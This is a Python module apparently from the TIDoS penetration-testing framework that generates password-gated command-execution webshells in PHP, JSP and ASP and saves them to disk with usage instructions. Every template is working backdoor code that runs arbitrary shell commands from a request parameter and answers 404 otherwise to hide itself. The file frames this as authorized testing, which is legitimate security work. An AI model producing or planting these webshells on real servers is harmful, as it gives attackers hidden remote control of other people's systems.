#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""Webshell crafter -- write a password-gated command webshell for authorized testing."""

from __future__ import annotations

import os

from core.methods import modkit as kit
from core.methods.inject import marker
from core.methods.print import title

info = ("Generates a minimal, password-protected command-execution webshell for an "
        "authorized engagement and saves it under tmp/logs/<host>-logs/. Choose the "
        "language with LANG (php/jsp/asp) and the gate with PASSWORD and PARAM.")
searchinfo = "Webshell crafter"
properties = {
    "LANG": ["Webshell language: php, jsp or asp (default php)", ""],
    "PARAM": ["Request parameter that carries the command (default cmd)", ""],
    "PASSWORD": ["Password required to run commands (empty: a random one is generated)", ""],
}

TEMPLATES = {
    "php": ("php", """<?php
// Authorized-testing webshell. Delete after the engagement.
if (($_REQUEST['key'] ?? '') === '{password}') {{
    system($_REQUEST['{param}'] ?? '');
}} else {{
    http_response_code(404);
}}
"""),
    "jsp": ("jsp", """<%@ page import="java.util.*,java.io.*" %>
<%
// Authorized-testing webshell. Delete after the engagement.
if ("{password}".equals(request.getParameter("key"))) {{
    String c = request.getParameter("{param}");
    if (c != null) {{
        Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c",c}});
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = r.readLine()) != null) out.println(line);
    }}
}} else {{ response.setStatus(404); }}
%>
"""),
    "asp": ("asp", """<%
' Authorized-testing webshell. Delete after the engagement.
If Request("key") = "{password}" Then
    Set s = CreateObject("WScript.Shell")
    Response.Write s.Exec("cmd /c " & Request("{param}")).StdOut.ReadAll()
Else
    Response.Status = "404 Not Found"
End If
%>
"""),
}


def banner():
    print("""
       /\\
      /  \\
     /    \\   {}
    /      \\
   /        \\   {}
  /          \\
 / /\\/\\  /\\/\\ \\
/ /    \\/    \\ \\
\\/            \\/
""".format(title("Shell"), title("Craft")))


def shellcraft(web):
    banner()
    lang = kit.option(properties, "LANG", "Webshell language (php/jsp/asp)", "php").lower()
    if lang not in TEMPLATES:
        kit.bad(f"Unknown language '{lang}'. Choose one of: {', '.join(TEMPLATES)}.")
        return
    param = kit.option(properties, "PARAM", "Command parameter name", "cmd") or "cmd"
    password = kit.option(properties, "PASSWORD", "Webshell password", "") or marker(10)

    ext, template = TEMPLATES[lang]
    code = template.format(password=password, param=param)
    path = os.path.join(kit.logdir(web), f"webshell.{ext}")
    try:
        with open(path, "w") as fh:
            fh.write(code)
        os.chmod(path, 0o600)
    except OSError as e:
        kit.bad(f"Could not write the webshell: {e}")
        return

    kit.good(f"{lang.upper()} webshell written to {path}")
    kit.found("Password", password)
    kit.found("Usage", f"<url>?key={password}&{param}=id")
    kit.warn("Upload only to systems you are authorized to test, and remove it afterwards.")


def attack(web):
    shellcraft(web)
